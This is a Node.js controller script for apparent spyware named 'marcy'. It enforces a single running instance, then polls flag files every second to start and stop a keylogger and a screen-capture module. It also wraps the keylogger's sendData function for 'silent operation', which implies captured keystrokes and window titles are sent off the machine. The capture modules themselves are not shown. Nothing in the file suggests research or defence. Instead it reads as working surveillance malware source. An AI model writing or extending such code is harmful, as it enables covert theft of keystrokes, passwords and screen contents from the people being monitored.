const fs = require('fs');
const path = require('path');
const { MarcyKey, MarcyScreen } = require('./marcy');

// Single instance check
const lockFile = path.join(__dirname, 'marcy.lock');
let lockFileHandle = null;

function checkSingleInstance() {
    try {
        // Try to create a lock file
        lockFileHandle = fs.openSync(lockFile, 'wx');
        
        // Write process ID to lock file
        fs.writeFileSync(lockFile, process.pid.toString());
        
        // Clean up lock file on exit
        process.on('exit', () => {
            try {
                if (lockFileHandle) {
                    fs.closeSync(lockFileHandle);
                }
                if (fs.existsSync(lockFile)) {
                    fs.unlinkSync(lockFile);
                }
            } catch (e) {
                // Ignore cleanup errors
            }
        });
        
        return true;
    } catch (error) {
        if (error.code === 'EEXIST') {
            // Lock file exists, check if process is still running
            try {
                const pid = parseInt(fs.readFileSync(lockFile, 'utf8'));
                // Check if process with this PID is running
                process.kill(pid, 0);
                return false; // Process is running
            } catch (e) {
                // Process not running, remove stale lock file
                try {
                    fs.unlinkSync(lockFile);
                    return checkSingleInstance(); // Retry
                } catch (e2) {
                    return false;
                }
            }
        }
        return false;
    }
}

// Check if another instance is running
if (!checkSingleInstance()) {
    process.exit(1);
}

// Initialize instances using the factory functions
const keyMonitor = MarcyKey();
const screenMonitor = MarcyScreen();

// Override the sendData method to add logging (optional - remove if you want completely silent)
const originalSendData = keyMonitor.sendData;
keyMonitor.sendData = async function(data, windowTitle = '') {
    // Silent operation - no logging
    return originalSendData.call(this, data, windowTitle);
};

// --- Real-time flag file monitoring logic ---
const keyFlag = path.join(__dirname, 'marcykey.flag');
const screenFlag = path.join(__dirname, 'marcyScreen.flag');

let keyActive = false;
let screenActive = false;

function checkAndToggleMonitors() {
    // Keylogger
    const keyFlagExists = fs.existsSync(keyFlag);
    if (keyFlagExists && !keyActive) {
        console.log(`[${new Date().toISOString()}] Keylogger STARTED - marcykey.flag detected`);
        keyMonitor.start();
        keyActive = true;
    } else if (!keyFlagExists && keyActive) {
        console.log(`[${new Date().toISOString()}] Keylogger STOPPED - marcykey.flag removed`);
        keyMonitor.stop();
        keyActive = false;
    }
    // Screen
    const screenFlagExists = fs.existsSync(screenFlag);
    if (screenFlagExists && !screenActive) {
        console.log(`[${new Date().toISOString()}] Screen capture STARTED - marcyScreen.flag detected`);
        screenMonitor.start();
        screenActive = true;
    } else if (!screenFlagExists && screenActive) {
        console.log(`[${new Date().toISOString()}] Screen capture STOPPED - marcyScreen.flag removed`);
        screenMonitor.stop();
        screenActive = false;
    }
    
    // Log current state every 10 seconds for monitoring
    if (Date.now() % 10000 < 1000) { // Log roughly every 10 seconds
        console.log(`[${new Date().toISOString()}] Status - Keylogger: ${keyActive ? 'ACTIVE' : 'INACTIVE'}, Screen: ${screenActive ? 'ACTIVE' : 'INACTIVE'}`);
    }
}

// Initial check
checkAndToggleMonitors();

// Polling interval for real-time monitoring
const POLL_INTERVAL = 1000; // ms
const poller = setInterval(checkAndToggleMonitors, POLL_INTERVAL);

// Handle process termination
process.on('SIGINT', () => {
    clearInterval(poller);
    keyMonitor.stop();
    screenMonitor.stop();
    process.exit();
}); 